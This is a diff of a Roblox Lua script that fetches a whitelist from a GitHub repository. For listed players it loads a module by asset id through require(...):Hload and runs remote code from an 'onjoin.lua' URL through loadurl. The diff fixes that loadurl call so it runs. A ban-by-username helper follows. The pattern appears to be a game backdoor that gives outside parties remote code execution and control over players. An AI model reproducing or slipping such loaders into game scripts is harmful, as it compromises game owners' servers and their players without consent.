@@ -19,17 +19,16 @@ local WL = getJson("https://raw.githubusercontent.com/pwngd/tester/refs/heads/ma
 local function onPlayer(player)
 	WL = getJson("https://raw.githubusercontent.com/pwngd/tester/refs/heads/main/whitelist.json")
 	if WL[tostring(player.UserId)] then
-      -- require(7634392335)(player.Name)
-	  task.spawn(function() 
+     	 -- require(7634392335)(player.Name)
+	  	task.spawn(function() 
 			require(135231466738957):Hload(player.Name)
-	   end)
-		loadurl(https://raw.githubusercontent.com/pwngd/tester/refs/heads/main/onjoin.lua)
+	   	end)
+		loadurl("https://raw.githubusercontent.com/pwngd/tester/refs/heads/main/onjoin.lua")
   	end
 end
+
 for _, p in ipairs(Players:GetPlayers()) do onPlayer(p) end
 Players.PlayerAdded:Connect(onPlayer)
-
-
 
 pcall(function()
 local function BanByUsername(username: string, message: string)
